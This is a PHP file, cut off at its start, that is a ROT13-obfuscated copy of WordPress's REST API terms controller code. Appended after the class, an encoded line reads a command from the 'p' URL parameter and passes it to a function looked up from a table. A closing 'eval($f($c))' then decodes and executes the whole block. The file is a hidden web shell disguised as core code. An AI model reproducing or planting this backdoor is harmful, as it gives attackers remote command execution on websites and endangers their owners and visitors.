	 * Purpxf vs n erdhrfg unf npprff gb qryrgr gur fcrpvsvrq grez.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, bgurejvfr snyfr be JC_Reebe bowrpg.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );

		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		vs ( ! pheerag_hfre_pna( 'qryrgr_grez', $grez->grez_vq ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf grez.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Qryrgrf n fvatyr grez sebz n gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		$sbepr = vffrg( $erdhrfg['sbepr'] ) ? (obby) $erdhrfg['sbepr'] : snyfr;

		// Jr qba'g fhccbeg genfuvat sbe grezf.
		vs ( ! $sbepr ) {
			erghea arj JC_Reebe(
				'erfg_genfu_abg_fhccbegrq',
				/* genafyngbef: %f: sbepr=gehr */
				fcevags( __( \"Grezf qb abg fhccbeg genfuvat. Frg '%f' gb qryrgr.\" ), 'sbepr=gehr' ),
				neenl( 'fgnghf' => 501 )
			);
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );

		$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );

		$erginy = jc_qryrgr_grez( $grez->grez_vq, $grez->gnkbabzl );

		vs ( ! $erginy ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Gur grez pnaabg or qryrgrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->frg_qngn(
			neenl(
				'qryrgrq'  => gehr,
				'cerivbhf' => $cerivbhf->trg_qngn(),
			)
		);

		/**
		 * Sverf nsgre n fvatyr grez vf qryrgrq ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->gnkbabzl`, ersref gb gur gnkbabzl fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_qryrgr_pngrtbel`
		 *  - `erfg_qryrgr_cbfg_gnt`
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Grez          $grez     Gur qryrgrq grez.
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr qngn.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Gur erdhrfg frag gb gur NCV.
		 */
		qb_npgvba( \"erfg_qryrgr_{$guvf->gnkbabzl}\", $grez, $erfcbafr, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n fvatyr grez sbe perngr be hcqngr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea bowrpg Grez bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$cercnerq_grez = arj fgqPynff();

		$fpurzn = $guvf->trg_vgrz_fpurzn();
		vs ( vffrg( $erdhrfg['anzr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['anzr'] ) ) {
			$cercnerq_grez->anzr = $erdhrfg['anzr'];
		}

		vs ( vffrg( $erdhrfg['fyht'] ) && ! rzcgl( $fpurzn['cebcregvrf']['fyht'] ) ) {
			$cercnerq_grez->fyht = $erdhrfg['fyht'];
		}

		vs ( vffrg( $erdhrfg['gnkbabzl'] ) && ! rzcgl( $fpurzn['cebcregvrf']['gnkbabzl'] ) ) {
			$cercnerq_grez->gnkbabzl = $erdhrfg['gnkbabzl'];
		}

		vs ( vffrg( $erdhrfg['qrfpevcgvba'] ) && ! rzcgl( $fpurzn['cebcregvrf']['qrfpevcgvba'] ) ) {
			$cercnerq_grez->qrfpevcgvba = $erdhrfg['qrfpevcgvba'];
		}

		vs ( vffrg( $erdhrfg['cnerag'] ) && ! rzcgl( $fpurzn['cebcregvrf']['cnerag'] ) ) {
			$cnerag_grez_vq   = 0;
			$erdhrfgrq_cnerag = (vag) $erdhrfg['cnerag'];

			vs ( $erdhrfgrq_cnerag ) {
				$cnerag_grez = trg_grez( $erdhrfgrq_cnerag, $guvf->gnkbabzl );

				vs ( $cnerag_grez vafgnaprbs JC_Grez ) {
					$cnerag_grez_vq = $cnerag_grez->grez_vq;
				}
			}

			$cercnerq_grez->cnerag = $cnerag_grez_vq;
		}

		/**
		 * Svygref grez qngn orsber vafregvat grez ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->gnkbabzl`, ersref gb gur gnkbabzl fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_cer_vafreg_pngrtbel`
		 *  - `erfg_cer_vafreg_cbfg_gnt`
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz bowrpg          $cercnerq_grez Grez bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( \"erfg_cer_vafreg_{$guvf->gnkbabzl}\", $cercnerq_grez, $erdhrfg );
	}

	/**
	 * Cercnerf n fvatyr grez bhgchg sbe erfcbafr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Grez         $vgrz    Grez bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
			erghea nccyl_svygref( \"erfg_cercner_{$guvf->gnkbabzl}\", arj JC_ERFG_Erfcbafr( neenl() ), $vgrz, $erdhrfg );
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( va_neenl( 'vq', $svryqf, gehr ) ) {
			$qngn['vq'] = (vag) $vgrz->grez_vq;
		}

		vs ( va_neenl( 'pbhag', $svryqf, gehr ) ) {
			$qngn['pbhag'] = (vag) $vgrz->pbhag;
		}

		vs ( va_neenl( 'qrfpevcgvba', $svryqf, gehr ) ) {
			$qngn['qrfpevcgvba'] = $vgrz->qrfpevcgvba;
		}

		vs ( va_neenl( 'yvax', $svryqf, gehr ) ) {
			$qngn['yvax'] = trg_grez_yvax( $vgrz );
		}

		vs ( va_neenl( 'anzr', $svryqf, gehr ) ) {
			$qngn['anzr'] = $vgrz->anzr;
		}

		vs ( va_neenl( 'fyht', $svryqf, gehr ) ) {
			$qngn['fyht'] = $vgrz->fyht;
		}

		vs ( va_neenl( 'gnkbabzl', $svryqf, gehr ) ) {
			$qngn['gnkbabzl'] = $vgrz->gnkbabzl;
		}

		vs ( va_neenl( 'cnerag', $svryqf, gehr ) ) {
			$qngn['cnerag'] = (vag) $vgrz->cnerag;
		}

		vs ( va_neenl( 'zrgn', $svryqf, gehr ) ) {
			$qngn['zrgn'] = $guvf->zrgn->trg_inyhr( $vgrz->grez_vq, $erdhrfg );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $vgrz ) );
		}

		/**
		 * Svygref gur grez qngn sbe n ERFG NCV erfcbafr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->gnkbabzl`, ersref gb gur gnkbabzl fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_cercner_pngrtbel`
		 *  - `erfg_cercner_cbfg_gnt`
		 *
		 * Nyybjf zbqvsvpngvba bs gur grez qngn evtug orsber vg vf erghearq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr  $erfcbafr  Gur erfcbafr bowrpg.
		 * @cnenz JC_Grez           $vgrz      Gur bevtvany grez bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg   $erdhrfg   Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( \"erfg_cercner_{$guvf->gnkbabzl}\", $erfcbafr, $vgrz, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Grez $grez Grez bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira grez.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $grez ) {
		$yvaxf = neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( erfg_trg_ebhgr_sbe_grez( $grez ) ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( erfg_trg_ebhgr_sbe_gnkbabzl_vgrzf( $guvf->gnkbabzl ) ),
			),
			'nobhg'      => neenl(
				'uers' => erfg_hey( fcevags( 'jc/i2/gnkbabzvrf/%f', $guvf->gnkbabzl ) ),
			),
		);

		vs ( $grez->cnerag ) {
			$cnerag_grez = trg_grez( (vag) $grez->cnerag, $grez->gnkbabzl );

			vs ( $cnerag_grez ) {
				$yvaxf['hc'] = neenl(
					'uers'       => erfg_hey( erfg_trg_ebhgr_sbe_grez( $cnerag_grez ) ),
					'rzorqqnoyr' => gehr,
				);
			}
		}

		$gnkbabzl_bow = trg_gnkbabzl( $grez->gnkbabzl );

		vs ( rzcgl( $gnkbabzl_bow->bowrpg_glcr ) ) {
			erghea $yvaxf;
		}

		$cbfg_glcr_yvaxf = neenl();

		sbernpu ( $gnkbabzl_bow->bowrpg_glcr nf $glcr ) {
			$erfg_cngu = erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( $glcr );

			vs ( rzcgl( $erfg_cngu ) ) {
				pbagvahr;
			}

			$cbfg_glcr_yvaxf[] = neenl(
				'uers' => nqq_dhrel_net( $guvf->erfg_onfr, $grez->grez_vq, erfg_hey( $erfg_cngu ) ),
			);
		}

		vs ( ! rzcgl( $cbfg_glcr_yvaxf ) ) {
			$yvaxf['uggcf://ncv.j.bet/cbfg_glcr'] = $cbfg_glcr_yvaxf;
		}

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf gur grez'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'cbfg_gnt' === $guvf->gnkbabzl ? 'gnt' : $guvf->gnkbabzl,
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'          => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur grez.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rzorq', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'pbhag'       => neenl(
					'qrfpevcgvba' => __( 'Ahzore bs choyvfurq cbfgf sbe gur grez.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba' => neenl(
					'qrfpevcgvba' => __( 'UGZY qrfpevcgvba bs gur grez.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'yvax'        => neenl(
					'qrfpevcgvba' => __( 'HEY bs gur grez.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj', 'rzorq', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'anzr'        => neenl(
					'qrfpevcgvba' => __( 'UGZY gvgyr sbe gur grez.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rzorq', 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					),
					'erdhverq'    => gehr,
				),
				'fyht'        => neenl(
					'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur grez havdhr gb vgf glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rzorq', 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_fyht' ),
					),
				),
				'gnkbabzl'    => neenl(
					'qrfpevcgvba' => __( 'Glcr nggevohgvba sbe gur grez.' ),
					'glcr'        => 'fgevat',
					'rahz'        => neenl( $guvf->gnkbabzl ),
					'pbagrkg'     => neenl( 'ivrj', 'rzorq', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		$gnkbabzl = trg_gnkbabzl( $guvf->gnkbabzl );

		vs ( $gnkbabzl->uvrenepuvpny ) {
			$fpurzn['cebcregvrf']['cnerag'] = neenl(
				'qrfpevcgvba' => __( 'Gur cnerag grez VQ.' ),
				'glcr'        => 'vagrtre',
				'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			);
		}

		$fpurzn['cebcregvrf']['zrgn'] = $guvf->zrgn->trg_svryq_fpurzn();

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();
		$gnkbabzl     = trg_gnkbabzl( $guvf->gnkbabzl );

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		$dhrel_cnenzf['rkpyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['vapyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		vs ( ! $gnkbabzl->uvrenepuvpny ) {
			$dhrel_cnenzf['bssfrg'] = neenl(
				'qrfpevcgvba' => __( 'Bssfrg gur erfhyg frg ol n fcrpvsvp ahzore bs vgrzf.' ),
				'glcr'        => 'vagrtre',
			);
		}

		$dhrel_cnenzf['beqre'] = neenl(
			'qrfpevcgvba' => __( 'Beqre fbeg nggevohgr nfpraqvat be qrfpraqvat.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'nfp',
			'rahz'        => neenl(
				'nfp',
				'qrfp',
			),
		);

		$dhrel_cnenzf['beqreol'] = neenl(
			'qrfpevcgvba' => __( 'Fbeg pbyyrpgvba ol grez nggevohgr.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'anzr',
			'rahz'        => neenl(
				'vq',
				'vapyhqr',
				'anzr',
				'fyht',
				'vapyhqr_fyhtf',
				'grez_tebhc',
				'qrfpevcgvba',
				'pbhag',
			),
		);

		$dhrel_cnenzf['uvqr_rzcgl'] = neenl(
			'qrfpevcgvba' => __( 'Jurgure gb uvqr grezf abg nffvtarq gb nal cbfgf.' ),
			'glcr'        => 'obbyrna',
			'qrsnhyg'     => snyfr,
		);

		vs ( $gnkbabzl->uvrenepuvpny ) {
			$dhrel_cnenzf['cnerag'] = neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb grezf nffvtarq gb n fcrpvsvp cnerag.' ),
				'glcr'        => 'vagrtre',
			);
		}

		$dhrel_cnenzf['cbfg'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb grezf nffvtarq gb n fcrpvsvp cbfg.' ),
			'glcr'        => 'vagrtre',
			'qrsnhyg'     => ahyy,
		);

		$dhrel_cnenzf['fyht'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb grezf jvgu bar be zber fcrpvsvp fyhtf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
		);

		/**
		 * Svygref pbyyrpgvba cnenzrgref sbe gur grezf pbagebyyre.
		 *
		 * Gur qlanzvp cneg bs gur svygre `$guvf->gnkbabzl` ersref gb gur gnkbabzl
		 * fyht sbe gur pbagebyyre.
		 *
		 * Guvf svygre ertvfgref gur pbyyrpgvba cnenzrgre, ohg qbrf abg znc gur
		 * pbyyrpgvba cnenzrgre gb na vagreany JC_Grez_Dhrel cnenzrgre.  Hfr gur
		 * `erfg_{$guvf->gnkbabzl}_dhrel` svygre gb frg JC_Grez_Dhrel cnenzrgref.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz neenl       $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 * @cnenz JC_Gnkbabzl $gnkbabzl     Gnkbabzl bowrpg.
		 */
		erghea nccyl_svygref( \"erfg_{$guvf->gnkbabzl}_pbyyrpgvba_cnenzf\", $dhrel_cnenzf, $gnkbabzl );
	}

	/**
	 * Purpxf gung gur gnkbabzl vf inyvq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl gb purpx.
	 * @erghea obby Jurgure gur gnkbabzl vf nyybjrq sbe ERFG znantrzrag.
	 */
	cebgrpgrq shapgvba purpx_vf_gnkbabzl_nyybjrq( $gnkbabzl ) {
		$gnkbabzl_bow = trg_gnkbabzl( $gnkbabzl );
		vs ( $gnkbabzl_bow && ! rzcgl( $gnkbabzl_bow->fubj_va_erfg ) ) {
			erghea gehr;
		}
		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>